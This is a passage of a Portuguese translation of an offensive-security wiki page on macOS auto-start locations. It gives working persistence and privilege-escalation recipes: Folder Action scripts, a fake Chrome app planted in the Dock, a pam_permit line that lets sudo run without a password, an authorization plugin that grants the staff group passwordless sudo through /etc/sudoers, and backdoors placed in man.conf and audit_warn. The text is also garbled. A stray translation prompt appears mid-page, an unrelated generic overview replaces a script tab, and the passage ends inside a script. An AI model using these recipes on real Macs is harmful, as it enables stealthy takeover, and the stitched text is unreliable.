* **`/Library/Scripts/Folder Action Scripts`**
* Requer privilégios de root
* **Gatilho**: Acesso à pasta especificada
* **`~/Library/Scripts/Folder Action Scripts`**
* **Gatilho**: Acesso à pasta especificada

#### Descrição e Exploração

Um script de Ação de Pasta é executado quando itens são adicionados ou removidos da pasta à qual ele está anexado, ou quando sua janela é aberta, fechada, movida ou redimensionada:

* Abrir a pasta via interface do Finder
* Adicionar um arquivo à pasta (pode ser feito arrastando e soltando ou até mesmo em um prompt de terminal)
* Remover um arquivo da pasta (pode ser feito arrastando e soltando ou até mesmo em um prompt de terminal)
* Navegar para fora da pasta via interface do usuário

Existem algumas maneiras de implementar isso:

1. Usar o programa [Automator](https://support.apple.com/guide/automator/welcome/mac) para criar um arquivo de fluxo de trabalho de Ação de Pasta (.workflow) e instalá-lo como um serviço.
2. Clicar com o botão direito em uma pasta, selecionar `Configurar Ações de Pasta...`, `Executar Serviço` e anexar manualmente um script.
3. Usar o OSAScript para enviar mensagens de Evento Apple para o `System Events.app` para consultar e registrar programaticamente uma nova `Ação de Pasta`.

* Esta é a maneira de implementar persistência usando um OSAScript para enviar mensagens de Evento Apple para o `System Events.app`

Este é o script que será executado:

{% code title="source.js" %}
```applescript
var app = Application.currentApplication();
app.includeStandardAdditions = true;
app.doShellScript("touch /tmp/folderaction.txt");
app.doShellScript("touch ~/Desktop/folderaction.txt");
app.doShellScript("mkdir /tmp/asd123");
app.doShellScript("cp -R ~/Desktop /tmp/asd123");
```
{% endcode %}

Compile-o com: `osacompile -l JavaScript -o pasta.scpt source.js`

Em seguida, execute o seguinte script para habilitar as Ações de Pasta e anexar o script compilado anteriormente à pasta **`/users/username/Desktop`**:
```javascript
var se = Application("System Events");
se.folderActionsEnabled = true;
var myScript = se.Script({name: "source.js", posixPath: "/tmp/source.js"});
var fa = se.FolderAction({name: "Desktop", path: "/Users/username/Desktop"});
se.folderActions.push(fa);
fa.scripts.push(myScript);
```
Execute o script com: `osascript -l JavaScript /Users/username/attach.scpt`



* Esta é a maneira de implementar essa persistência via GUI:

Este é o script que será executado:

{% code title="source.js" %}
```applescript
var app = Application.currentApplication();
app.includeStandardAdditions = true;
app.doShellScript("touch /tmp/folderaction.txt");
app.doShellScript("touch ~/Desktop/folderaction.txt");
app.doShellScript("mkdir /tmp/asd123");
app.doShellScript("cp -R ~/Desktop /tmp/asd123");
```
{% endcode %}

Compile-o com: `osacompile -l JavaScript -o folder.scpt source.js`

Mova-o para:
```bash
mkdir -p "$HOME/Library/Scripts/Folder Action Scripts"
mv /tmp/folder.scpt "$HOME/Library/Scripts/Folder Action Scripts"
```
Em seguida, abra o aplicativo `Folder Actions Setup`, selecione a **pasta que você deseja monitorar** e selecione no seu caso **`folder.scpt`** (no meu caso, eu o chamei de output2.scp):

<figure><img src="../.gitbook/assets/image (2) (1) (1) (1).png" alt="" width="297"><figcaption></figcaption></figure>

Agora, se você abrir essa pasta com o **Finder**, seu script será executado.

Essa configuração foi armazenada no **plist** localizado em **`~/Library/Preferences/com.apple.FolderActionsDispatcher.plist`** em formato base64.

Agora, vamos tentar preparar essa persistência sem acesso à GUI:

1. **Copie `~/Library/Preferences/com.apple.FolderActionsDispatcher.plist`** para `/tmp` para fazer backup:
* `cp ~/Library/Preferences/com.apple.FolderActionsDispatcher.plist /tmp`
2. **Remova** as Folder Actions que você acabou de configurar:

<figure><img src="../.gitbook/assets/image (3).png" alt=""><figcaption></figcaption></figure>

Agora que temos um ambiente vazio

3. Copie o arquivo de backup: `cp /tmp/com.apple.FolderActionsDispatcher.plist ~/Library/Preferences/`
4. Abra o aplicativo Folder Actions Setup para consumir essa configuração: `open "/System/Library/CoreServices/Applications/Folder Actions Setup.app/"`

{% hint style="danger" %}
E isso não funcionou para mim, mas essas são as instruções do writeup :(
{% endhint %}

### Importadores do Spotlight

Writeup: [https://theevilbit.github.io/beyond/beyond\_0011/](https://theevilbit.github.io/beyond/beyond\_0011/)

* Útil para contornar o sandbox: [🟠](https://emojipedia.org/large-orange-circle)
* Mas você acabará em um novo

#### Localização

* **`/Library/Spotlight`**&#x20;
* **`~/Library/Spotlight`**

#### Descrição

Você acabará em um **sandbox pesado**, então provavelmente não deseja usar essa técnica.

### Atalhos do Dock

Writeup: [https://theevilbit.github.io/beyond/beyond\_0027/](https://theevilbit.github.io/beyond/beyond\_0027/)

* Útil para contornar o sandbox: [✅](https://emojipedia.org/check-mark-button)
* Mas você precisa ter instalado um aplicativo malicioso no sistema

#### Localização

* `~/Library/Preferences/com.apple.dock.plist`
* **Gatilho**: Quando o usuário clica no aplicativo dentro do dock

#### Descrição e Exploração

Todos os aplicativos que aparecem no Dock são especificados dentro do plist: **`~/Library/Preferences/com.apple.dock.plist`**

É possível **adicionar um aplicativo** apenas com:

{% code overflow="wrap" %}
```bash
# Add /System/Applications/Books.app
defaults write com.apple.dock persistent-apps -array-add '<dict><key>tile-data</key><dict><key>file-data</key><dict><key>_CFURLString</key><string>/System/Applications/Books.app</string><key>_CFURLStringType</key><integer>0</integer></dict></dict></dict>'

# Restart Dock
killall Dock
```
{% endcode %}

Usando alguma **engenharia social**, você poderia **se passar, por exemplo, pelo Google Chrome** dentro do dock e realmente executar seu próprio script:
```bash
#!/bin/sh

# THIS REQUIRES GOOGLE CHROME TO BE INSTALLED (TO COPY THE ICON)

rm -rf /tmp/Google\ Chrome.app/ 2>/dev/null

# Create App structure
mkdir -p /tmp/Google\ Chrome.app/Contents/MacOS
mkdir -p /tmp/Google\ Chrome.app/Contents/Resources

# Payload to execute
echo '#!/bin/sh
open /Applications/Google\ Chrome.app/ &
touch /tmp/ImGoogleChrome' > /tmp/Google\ Chrome.app/Contents/MacOS/Google\ Chrome

chmod +x /tmp/Google\ Chrome.app/Contents/MacOS/Google\ Chrome

# Info.plist
cat << EOF > /tmp/Google\ Chrome.app/Contents/Info.plist
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN"
"http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
<key>CFBundleExecutable</key>
<string>Google Chrome</string>
<key>CFBundleIdentifier</key>
<string>com.google.Chrome</string>
<key>CFBundleName</key>
<string>Google Chrome</string>
<key>CFBundleVersion</key>
<string>1.0</string>
<key>CFBundleShortVersionString</key>
<string>1.0</string>
<key>CFBundleInfoDictionaryVersion</key>
<string>6.0</string>
<key>CFBundlePackageType</key>
<string>APPL</string>
<key>CFBundleIconFile</key>
<string>app</string>
</dict>
</plist>
EOF

# Copy icon from Google Chrome
cp /Applications/Google\ Chrome.app/Contents/Resources/app.icns /tmp/Google\ Chrome.app/Contents/Resources/app.icns

# Add to Dock
defaults write com.apple.dock persistent-apps -array-add '<dict><key>tile-data</key><dict><key>file-data</key><dict><key>_CFURLString</key><string>/tmp/Google Chrome.app</string><key>_CFURLStringType</key><integer>0</integer></dict></dict></dict>'
killall Dock
```
### Seletores de Cores

Descrição: [https://theevilbit.github.io/beyond/beyond\_0017](https://theevilbit.github.io/beyond/beyond\_0017/)

* Útil para contornar o sandbox: [🟠](https://emojipedia.org/large-orange-circle)
* Uma ação muito específica precisa acontecer
* Você acabará em outro sandbox

#### Localização

* `/Library/ColorPickers`&#x20;
* Requer privilégios de root
* Gatilho: Usar o seletor de cores
* `~/Library/ColorPickers`
* Gatilho: Usar o seletor de cores

#### Descrição e Exploração

**Compile um pacote** de seletor de cores com seu código (você pode usar [**este, por exemplo**](https://github.com/viktorstrate/color-picker-plus)) e adicione um construtor (como na seção [Protetor de Tela](macos-auto-start-locations.md#screen-saver)) e copie o pacote para `~/Library/ColorPickers`.

Então, quando o seletor de cores for acionado, seu código também será.

Observe que o binário que carrega sua biblioteca tem um **sandbox muito restritivo**: `/System/Library/Frameworks/AppKit.framework/Versions/C/XPCServices/LegacyExternalColorPickerService-x86_64.xpc/Contents/MacOS/LegacyExternalColorPickerService-x86_64`

{% code overflow="wrap" %}
```bash
[Key] com.apple.security.temporary-exception.sbpl
[Value]
[Array]
[String] (deny file-write* (home-subpath "/Library/Colors"))
[String] (allow file-read* process-exec file-map-executable (home-subpath "/Library/ColorPickers"))
[String] (allow file-read* (extension "com.apple.app-sandbox.read"))
```
{% endcode %}

### Plugins do Finder Sync

**Descrição**: [https://theevilbit.github.io/beyond/beyond\_0026/](https://theevilbit.github.io/beyond/beyond\_0026/)\
**Descrição**: [https://objective-see.org/blog/blog\_0x11.html](https://objective-see.org/blog/blog\_0x11.html)

* Útil para contornar o sandbox: **Não, porque você precisa executar seu próprio aplicativo**

#### Localização

* Um aplicativo específico

#### Descrição e Exploração

Um exemplo de aplicativo com uma Extensão do Finder Sync [**pode ser encontrado aqui**](https://github.com/D00MFist/InSync).

Os aplicativos podem ter `Extensões do Finder Sync`. Essa extensão será inserida em um aplicativo que será executado. Além disso, para que a extensão possa executar seu código, **ela deve ser assinada** com um certificado válido de desenvolvedor da Apple, deve estar **sandboxed** (embora exceções relaxadas possam ser adicionadas) e deve ser registrada com algo como:
```bash
pluginkit -a /Applications/FindIt.app/Contents/PlugIns/FindItSync.appex
pluginkit -e use -i com.example.InSync.InSync
```
### Protetor de Tela

Descrição: [https://theevilbit.github.io/beyond/beyond\_0016/](https://theevilbit.github.io/beyond/beyond\_0016/)\
Descrição: [https://posts.specterops.io/saving-your-access-d562bf5bf90b](https://posts.specterops.io/saving-your-access-d562bf5bf90b)

* Útil para contornar o sandbox: [🟠](https://emojipedia.org/large-orange-circle)
* Mas você acabará em um sandbox de aplicativo comum

#### Localização

* `/System/Library/Screen Savers`&#x20;
* Requer privilégios de root
* **Gatilho**: Selecionar o protetor de tela
* `/Library/Screen Savers`
* Requer privilégios de root
* **Gatilho**: Selecionar o protetor de tela
* `~/Library/Screen Savers`
* **Gatilho**: Selecionar o protetor de tela

<figure><img src="../.gitbook/assets/image (1) (1) (1) (1) (1) (1).png" alt="" width="375"><figcaption></figcaption></figure>

#### Descrição e Exploração

Crie um novo projeto no Xcode e selecione o modelo para gerar um novo **Protetor de Tela**. Em seguida, adicione o código a ele, por exemplo, o seguinte código para gerar logs.

**Compile** e copie o pacote `.saver` para **`~/Library/Screen Savers`**. Em seguida, abra a interface gráfica do Protetor de Tela e, ao clicar nele, ele deve gerar muitos logs:

{% code overflow="wrap" %}
```bash
sudo log stream --style syslog --predicate 'eventMessage CONTAINS[c] "hello_screensaver"'

Timestamp                       (process)[PID]
2023-09-27 22:55:39.622369+0200  localhost legacyScreenSaver[41737]: (ScreenSaverExample) hello_screensaver void custom(int, const char **)
2023-09-27 22:55:39.622623+0200  localhost legacyScreenSaver[41737]: (ScreenSaverExample) hello_screensaver -[ScreenSaverExampleView initWithFrame:isPreview:]
2023-09-27 22:55:39.622704+0200  localhost legacyScreenSaver[41737]: (ScreenSaverExample) hello_screensaver -[ScreenSaverExampleView hasConfigureSheet]
```
{% endcode %}

{% hint style="danger" %}
Observe que, devido às permissões do binário que carrega este código (`/System/Library/Frameworks/ScreenSaver.framework/PlugIns/legacyScreenSaver.appex/Contents/MacOS/legacyScreenSaver`), você estará **dentro do sandbox de aplicativos comuns**.
{% endhint %}

Código do protetor de tela:
```objectivec
//
//  ScreenSaverExampleView.m
//  ScreenSaverExample
//
//  Created by Carlos Polop on 27/9/23.
//

#import "ScreenSaverExampleView.h"

@implementation ScreenSaverExampleView

- (instancetype)initWithFrame:(NSRect)frame isPreview:(BOOL)isPreview
{
NSLog(@"hello_screensaver %s", __PRETTY_FUNCTION__);
self = [super initWithFrame:frame isPreview:isPreview];
if (self) {
[self setAnimationTimeInterval:1/30.0];
}
return self;
}

- (void)startAnimation
{
NSLog(@"hello_screensaver %s", __PRETTY_FUNCTION__);
[super startAnimation];
}

- (void)stopAnimation
{
NSLog(@"hello_screensaver %s", __PRETTY_FUNCTION__);
[super stopAnimation];
}

- (void)drawRect:(NSRect)rect
{
NSLog(@"hello_screensaver %s", __PRETTY_FUNCTION__);
[super drawRect:rect];
}

- (void)animateOneFrame
{
NSLog(@"hello_screensaver %s", __PRETTY_FUNCTION__);
return;
}

- (BOOL)hasConfigureSheet
{
NSLog(@"hello_screensaver %s", __PRETTY_FUNCTION__);
return NO;
}

- (NSWindow*)configureSheet
{
NSLog(@"hello_screensaver %s", __PRETTY_FUNCTION__);
return nil;
}

__attribute__((constructor))
void custom(int argc, const char **argv) {
NSLog(@"hello_screensaver %s", __PRETTY_FUNCTION__);
}

@end
```
### Plugins do Spotlight

Úteis para contornar a sandbox: [🟠](https://emojipedia.org/large-orange-circle)

* Mas você acabará em uma sandbox de aplicativo

#### Localização

* `~/Library/Spotlight/`
* **Gatilho**: Um novo arquivo com uma extensão gerenciada pelo plugin do Spotlight é criado.
* `/Library/Spotlight/`
* **Gatilho**: Um novo arquivo com uma extensão gerenciada pelo plugin do Spotlight é criado.
* Requer privilégios de root
* `/System/Library/Spotlight/`
* **Gatilho**: Um novo arquivo com uma extensão gerenciada pelo plugin do Spotlight é criado.
* Requer privilégios de root
* `Some.app/Contents/Library/Spotlight/`
* **Gatilho**: Um novo arquivo com uma extensão gerenciada pelo plugin do Spotlight é criado.
* Requer um novo aplicativo

#### Descrição e Exploração

O Spotlight é o recurso de pesquisa integrado do macOS, projetado para fornecer aos usuários acesso rápido e abrangente aos dados em seus computadores.\
Para facilitar essa capacidade de pesquisa rápida, o Spotlight mantém um **banco de dados proprietário** e cria um índice **analisando a maioria dos arquivos**, permitindo pesquisas rápidas tanto por nomes de arquivos quanto por seu conteúdo.

O mecanismo subjacente do Spotlight envolve um processo central chamado 'mds', que significa **'metadata server'**. Esse processo orquestra todo o serviço do Spotlight. Complementando isso, existem vários daemons 'mdworker' que executam uma variedade de tarefas de manutenção, como indexar diferentes tipos de arquivos (`ps -ef | grep mdworker`). Essas tarefas são possíveis por meio de plugins importadores do Spotlight, ou **".mdimporter bundles**", que permitem que o Spotlight entenda e indexe conteúdo em uma variedade diversificada de formatos de arquivo.

Os plugins ou pacotes **`.mdimporter`** estão localizados nos locais mencionados anteriormente e, se um novo pacote aparecer, ele é carregado em questão de minutos (não é necessário reiniciar nenhum serviço). Esses pacotes precisam indicar quais **tipos de arquivo e extensões eles podem gerenciar**, dessa forma, o Spotlight os usará quando um novo arquivo com a extensão indicada for criado.

É possível **encontrar todos os `mdimporters`** carregados executando:
```bash
mdimport -L
Paths: id(501) (
"/System/Library/Spotlight/iWork.mdimporter",
"/System/Library/Spotlight/iPhoto.mdimporter",
"/System/Library/Spotlight/PDF.mdimporter",
[...]
```
E, por exemplo, **/Library/Spotlight/iBooksAuthor.mdimporter** é usado para analisar esses tipos de arquivos (extensões `.iba` e `.book`, entre outros):
```json
plutil -p /Library/Spotlight/iBooksAuthor.mdimporter/Contents/Info.plist

[...]
"CFBundleDocumentTypes" => [
0 => {
"CFBundleTypeName" => "iBooks Author Book"
"CFBundleTypeRole" => "MDImporter"
"LSItemContentTypes" => [
0 => "com.apple.ibooksauthor.book"
1 => "com.apple.ibooksauthor.pkgbook"
2 => "com.apple.ibooksauthor.template"
3 => "com.apple.ibooksauthor.pkgtemplate"
]
"LSTypeIsPackage" => 0
}
]
[...]
=> {
"UTTypeConformsTo" => [
0 => "public.data"
1 => "public.composite-content"
]
"UTTypeDescription" => "iBooks Author Book"
"UTTypeIdentifier" => "com.apple.ibooksauthor.book"
"UTTypeReferenceURL" => "http://www.apple.com/ibooksauthor"
"UTTypeTagSpecification" => {
"public.filename-extension" => [
0 => "iba"
1 => "book"
]
}
}
[...]
```
{% hint style="danger" %}
Se você verificar o Plist de outros `mdimporter`, pode ser que não encontre a entrada **`UTTypeConformsTo`**. Isso ocorre porque é um _Uniform Type Identifiers_ ([UTI](https://en.wikipedia.org/wiki/Uniform\_Type_Identifier)) embutido e não precisa especificar extensões.

Além disso, os plugins padrão do sistema sempre têm precedência, portanto, um invasor só pode acessar arquivos que não são indexados pelos próprios `mdimporters` da Apple.
{% endhint %}

Para criar seu próprio importador, você pode começar com este projeto: [https://github.com/megrimm/pd-spotlight-importer](https://github.com/megrimm/pd-spotlight-importer) e, em seguida, alterar o nome, os **`CFBundleDocumentTypes`** e adicionar **`UTImportedTypeDeclarations`** para que ele suporte a extensão que você deseja e reflita isso em **`schema.xml`**.\
Em seguida, **altere** o código da função **`GetMetadataForFile`** para executar sua carga útil quando um arquivo com a extensão processada for criado.

Finalmente, **construa e copie seu novo `.mdimporter`** para um dos locais anteriores e você pode verificar sempre que ele for carregado **monitorando os logs** ou verificando **`mdimport -L.`**

### ~~Painel de Preferências~~

{% hint style="danger" %}
Parece que isso não está mais funcionando.
{% endhint %}

Artigo: [https://theevilbit.github.io/beyond/beyond\_0009/](https://theevilbit.github.io/beyond/beyond\_0009/)

* Útil para contornar o sandbox: [🟠](https://emojipedia.org/large-orange-circle)
* Requer uma ação específica do usuário

#### Localização

* **`/System/Library/PreferencePanes`**
* **`/Library/PreferencePanes`**
* **`~/Library/PreferencePanes`**

#### Descrição

Parece que isso não está mais funcionando.

## Bypass do Sandbox Root

{% hint style="success" %}
Aqui você pode encontrar locais de inicialização úteis para **contornar o sandbox** que permitem simplesmente executar algo **gravando-o em um arquivo** sendo **root** e/ou exigindo outras **condições estranhas**.
{% endhint %}

### Periódico

Artigo: [https://theevilbit.github.io/beyond/beyond\_0019/](https://theevilbit.github.io/beyond/beyond\_0019/)

* Útil para contornar o sandbox: [🟠](https://emojipedia.org/large-orange-circle)
* Mas você precisa ser root

#### Localização

* `/etc/periodic/daily`, `/etc/periodic/weekly`, `/etc/periodic/monthly`, `/usr/local/etc/periodic`
* Requer privilégios de root
* **Gatilho**: Quando chegar a hora
* `/etc/daily.local`, `/etc/weekly.local` ou `/etc/monthly.local`
* Requer privilégios de root
* **Gatilho**: Quando chegar a hora

#### Descrição e Exploração

Os scripts periódicos (**`/etc/periodic`**) são executados por causa dos **launch daemons** configurados em `/System/Library/LaunchDaemons/com.apple.periodic*`. Observe que os scripts armazenados em `/etc/periodic/` são **executados** como o **proprietário do arquivo**, portanto, isso não funcionará para uma possível escalada de privilégios.

{% code overflow="wrap" %}
```bash
# Launch daemons that will execute the periodic scripts
ls -l /System/Library/LaunchDaemons/com.apple.periodic*
-rw-r--r--  1 root  wheel  887 May 13 00:29 /System/Library/LaunchDaemons/com.apple.periodic-daily.plist
-rw-r--r--  1 root  wheel  895 May 13 00:29 /System/Library/LaunchDaemons/com.apple.periodic-monthly.plist
-rw-r--r--  1 root  wheel  891 May 13 00:29 /System/Library/LaunchDaemons/com.apple.periodic-weekly.plist

# The scripts located in their locations
ls -lR /etc/periodic
total 0
drwxr-xr-x  11 root  wheel  352 May 13 00:29 daily
drwxr-xr-x   5 root  wheel  160 May 13 00:29 monthly
drwxr-xr-x   3 root  wheel   96 May 13 00:29 weekly

/etc/periodic/daily:
total 72
-rwxr-xr-x  1 root  wheel  1642 May 13 00:29 110.clean-tmps
-rwxr-xr-x  1 root  wheel   695 May 13 00:29 130.clean-msgs
[...]

/etc/periodic/monthly:
total 24
-rwxr-xr-x  1 root  wheel   888 May 13 00:29 199.rotate-fax
-rwxr-xr-x  1 root  wheel  1010 May 13 00:29 200.accounting
-rwxr-xr-x  1 root  wheel   606 May 13 00:29 999.local

/etc/periodic/weekly:
total 8
-rwxr-xr-x  1 root  wheel  620 May 13 00:29 999.local
```
{% endcode %}

Existem outros scripts periódicos que serão executados indicados em **`/etc/defaults/periodic.conf`**:
```bash
grep "Local scripts" /etc/defaults/periodic.conf
daily_local="/etc/daily.local"				# Local scripts
weekly_local="/etc/weekly.local"			# Local scripts
monthly_local="/etc/monthly.local"			# Local scripts
```
Se você conseguir escrever qualquer um dos arquivos `/etc/daily.local`, `/etc/weekly.local` ou `/etc/monthly.local`, ele será **executado mais cedo ou mais tarde**.

{% hint style="warning" %}
Observe que o script periódico será **executado como o proprietário do script**. Portanto, se um usuário regular for o proprietário do script, ele será executado como esse usuário (isso pode impedir ataques de escalonamento de privilégios).
{% endhint %}

### PAM

Writeup: [Linux Hacktricks PAM](../linux-hardening/linux-post-exploitation/pam-pluggable-authentication-modules.md)\
Writeup: [https://theevilbit.github.io/beyond/beyond\_0005/](https://theevilbit.github.io/beyond/beyond\_0005/)

* Útil para contornar o sandbox: [🟠](https://emojipedia.org/large-orange-circle)
* Mas você precisa ser root

#### Localização

* Sempre requer privilégios de root

#### Descrição e Exploração

Como o PAM é mais focado em **persistência** e malware do que em execução fácil dentro do macOS, este blog não fornecerá uma explicação detalhada, **leia os writeups para entender melhor essa técnica**.

Verifique os módulos do PAM com:&#x20;
```bash
ls -l /etc/pam.d
```
Uma técnica de persistência/escalada de privilégios que abusa do PAM é tão simples quanto modificar o módulo /etc/pam.d/sudo adicionando no início a linha:
```bash
auth       sufficient     pam_permit.so
```
O seguinte é o conteúdo de um livro sobre técnicas de hacking. O conteúdo a seguir é do arquivo macos-hardening/macos-auto-start-locations.md. Traduza o texto relevante para o português e retorne a tradução mantendo exatamente a mesma sintaxe de markdown e html. Não traduza coisas como código, nomes de técnicas de hacking, palavras relacionadas a hacking, nomes de plataformas de nuvem/SaaS (como Workspace, aws, gcp...), a palavra 'leak', pentesting e tags de markdown. Além disso, não adicione nada além da tradução e da sintaxe de markdown.
```bash
# sudo: auth account password session
auth       sufficient     pam_permit.so
auth       include        sudo_local
auth       sufficient     pam_smartcard.so
auth       required       pam_opendirectory.so
account    required       pam_permit.so
password   required       pam_deny.so
session    required       pam_permit.so
```
E, portanto, qualquer tentativa de usar **`sudo` funcionará**.

{% hint style="danger" %}
Observe que este diretório é protegido pelo TCC, portanto é altamente provável que o usuário receba uma solicitação de acesso.
{% endhint %}

### Plugins de Autorização

Artigo: [https://theevilbit.github.io/beyond/beyond\_0028/](https://theevilbit.github.io/beyond/beyond\_0028/)\
Artigo: [https://posts.specterops.io/persistent-credential-theft-with-authorization-plugins-d17b34719d65](https://posts.specterops.io/persistent-credential-theft-with-authorization-plugins-d17b34719d65)

* Útil para contornar o sandbox: [🟠](https://emojipedia.org/large-orange-circle)
* Mas você precisa ser root e fazer configurações extras

#### Localização

* `/Library/Security/SecurityAgentPlugins/`
* Requer privilégios de root
* Também é necessário configurar o banco de dados de autorização para usar o plugin

#### Descrição e Exploração

Você pode criar um plugin de autorização que será executado quando um usuário fizer login para manter a persistência. Para obter mais informações sobre como criar um desses plugins, consulte os artigos anteriores (e tenha cuidado, um plugin mal escrito pode bloquear o acesso e você precisará limpar seu Mac no modo de recuperação).
```objectivec
// Compile the code and create a real bundle
// gcc -bundle -framework Foundation main.m -o CustomAuth
// mkdir -p CustomAuth.bundle/Contents/MacOS
// mv CustomAuth CustomAuth.bundle/Contents/MacOS/

#import <Foundation/Foundation.h>

__attribute__((constructor)) static void run()
{
NSLog(@"%@", @"[+] Custom Authorization Plugin was loaded");
system("echo \"%staff ALL=(ALL) NOPASSWD:ALL\" >> /etc/sudoers");
}
```
**Mova** o pacote para o local a ser carregado:
```bash
cp -r CustomAuth.bundle /Library/Security/SecurityAgentPlugins/
```
Finalmente, adicione a **regra** para carregar este Plugin:
```bash
cat > /tmp/rule.plist <<EOF
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
<key>class</key>
<string>evaluate-mechanisms</string>
<key>mechanisms</key>
<array>
<string>CustomAuth:login,privileged</string>
</array>
</dict>
</plist>
EOF

security authorizationdb write com.asdf.asdf < /tmp/rule.plist
```
Dispare-o com:
```bash
security authorize com.asdf.asdf
```
E então o **grupo de funcionários deve ter acesso sudo** (leia `/etc/sudoers` para confirmar).

### Man.conf

Descrição: [https://theevilbit.github.io/beyond/beyond\_0030/](https://theevilbit.github.io/beyond/beyond\_0030/)

* Útil para contornar o sandbox: [🟠](https://emojipedia.org/large-orange-circle)
* Mas você precisa ser root e o usuário deve usar o comando man

#### Localização

* **`/private/etc/man.conf`**
* Requer privilégios de root
* **`/private/etc/man.conf`**: Sempre que o comando man é usado

#### Descrição e Exploração

O arquivo de configuração **`/private/etc/man.conf`** indica o binário/script a ser usado ao abrir arquivos de documentação do comando man. Portanto, o caminho para o executável pode ser modificado para que toda vez que o usuário usar o comando man para ler alguns documentos, um backdoor seja executado.

Por exemplo, defina em **`/private/etc/man.conf`**:
```
MANPAGER /tmp/view
```
E em seguida, crie `/tmp/view` da seguinte forma:
```bash
#!/bin/zsh

touch /tmp/manconf

/usr/bin/less -s
```
### Apache2

**Descrição**: [https://theevilbit.github.io/beyond/beyond\_0023/](https://theevilbit.github.io/beyond/beyond\_0023/)

* Útil para contornar o sandbox: [🟠](https://emojipedia.org/large-orange-circle)
* Mas você precisa ser root e o apache precisa estar em execução

#### Localização

* **`/etc/apache2/httpd.conf`**
* Requer privilégios de root
* Gatilho: Quando o Apache2 é iniciado

#### Descrição e Exploração

Você pode indicar em /etc/apache2/httpd.conf para carregar um módulo adicionando uma linha como esta:

{% code overflow="wrap" %}
```bash
LoadModule my_custom_module /Users/Shared/example.dylib "My Signature Authority"
```
{% endcode %}

Desta forma, seus módulos compilados serão carregados pelo Apache. A única coisa é que você precisa **assiná-lo com um certificado Apple válido**, ou você precisa **adicionar um novo certificado confiável** no sistema e **assiná-lo** com ele.

Em seguida, se necessário, para garantir que o servidor seja iniciado, você pode executar:
```bash
sudo launchctl load -w /System/Library/LaunchDaemons/org.apache.httpd.plist
```
Exemplo de código para o Dylb:
```objectivec
#include <stdio.h>
#include <syslog.h>

__attribute__((constructor))
static void myconstructor(int argc, const char **argv)
{
printf("[+] dylib constructor called from %s\n", argv[0]);
syslog(LOG_ERR, "[+] dylib constructor called from %s\n", argv[0]);
}
```
### Estrutura de auditoria BSM

Descrição: [https://theevilbit.github.io/beyond/beyond\_0031/](https://theevilbit.github.io/beyond/beyond\_0031/)

* Útil para contornar o sandbox: [🟠](https://emojipedia.org/large-orange-circle)
* Mas você precisa ser root, o auditd precisa estar em execução e causar um aviso

#### Localização

* **`/etc/security/audit_warn`**
* Requer privilégios de root
* **Gatilho**: Quando o auditd detecta um aviso

#### Descrição e Exploração

Sempre que o auditd detecta um aviso, o script **`/etc/security/audit_warn`** é **executado**. Portanto, você pode adicionar sua carga útil nele.
```bash
echo "touch /tmp/auditd_warn" >> /etc/security/audit_warn
```
Você pode forçar um aviso com `sudo audit -n`.

### Itens de Inicialização

{% hint style="danger" %}
**Isso está obsoleto, portanto, nada deve ser encontrado nos seguintes diretórios.**
{% endhint %}

Um **StartupItem** é um **diretório** que é **colocado** em uma dessas duas pastas: `/Library/StartupItems/` ou `/System/Library/StartupItems/`

Após colocar um novo diretório em uma dessas duas localizações, **mais dois itens** precisam ser colocados dentro desse diretório. Esses dois itens são um **script rc** e um **plist** que contém algumas configurações. Este plist deve ser chamado de "**StartupParameters.plist**".

{% tabs %}
{% tab title="StartupParameters.plist" %}
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple Computer//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
<key>Description</key>
<string>This is a description of this service</string>
<key>OrderPreference</key>
<string>None</string> <!--Other req services to execute before this -->
<key>Provides</key>
<array>
<string>superservicename</string> <!--Name of the services provided by this file -->
</array>
</dict>
</plist>
```
{% tab title="superservicename" %}

# Localizações de Inicialização Automática do macOS

O macOS possui várias localizações onde os aplicativos podem ser configurados para iniciar automaticamente quando o sistema é inicializado. Essas localizações são usadas por aplicativos legítimos para fornecer funcionalidades adicionais ou para iniciar serviços em segundo plano.

No entanto, essas localizações também podem ser exploradas por atacantes para iniciar aplicativos maliciosos ou scripts de inicialização que podem comprometer a segurança do sistema.

Aqui estão algumas das principais localizações de inicialização automática do macOS:

## 1. LaunchAgents

Os LaunchAgents são arquivos de propriedade do usuário que são executados quando um usuário faz login. Eles são armazenados no diretório `~/Library/LaunchAgents` e têm a extensão `.plist`. Esses arquivos podem ser usados para iniciar aplicativos ou scripts de inicialização quando um usuário faz login.

## 2. LaunchDaemons

Os LaunchDaemons são arquivos de propriedade do sistema que são executados quando o sistema é inicializado. Eles são armazenados no diretório `/Library/LaunchDaemons` e têm a extensão `.plist`. Esses arquivos são usados para iniciar serviços em segundo plano que são executados independentemente de qualquer usuário fazer login.

## 3. Login Items

Os Login Items são aplicativos ou scripts que são configurados para iniciar automaticamente quando um usuário faz login. Eles são gerenciados nas preferências do sistema, na seção "Usuários e Grupos". Os Login Items podem ser usados para iniciar aplicativos ou scripts específicos para um usuário quando ele faz login.

## 4. Startup Items

Os Startup Items são aplicativos ou scripts que são configurados para iniciar automaticamente quando o sistema é inicializado. Eles são armazenados no diretório `/Library/StartupItems` e são executados antes que qualquer usuário faça login. No entanto, essa localização não é mais suportada nas versões mais recentes do macOS.

## 5. Cron Jobs

Os Cron Jobs são tarefas agendadas que são executadas em intervalos regulares. Eles são configurados usando o utilitário `cron` e podem ser usados para iniciar aplicativos ou scripts em horários específicos. Os Cron Jobs são armazenados no arquivo `/etc/crontab` e nos arquivos no diretório `/usr/lib/cron/tabs`.

## 6. LaunchAgents e LaunchDaemons de Terceiros

Além das localizações mencionadas acima, os aplicativos de terceiros também podem instalar seus próprios LaunchAgents e LaunchDaemons. Esses arquivos podem ser armazenados em diretórios específicos do aplicativo ou em diretórios compartilhados, como `/Library/LaunchAgents` e `/Library/LaunchDaemons`.

É importante revisar regularmente essas localizações de inicialização automática e remover qualquer aplicativo ou script indesejado ou desconhecido. Isso ajudará a garantir a segurança do sistema e evitar que aplicativos maliciosos sejam executados automaticamente.

{% endtab %}
```bash
#!/bin/sh
. /etc/rc.common

StartService(){
touch /tmp/superservicestarted
}

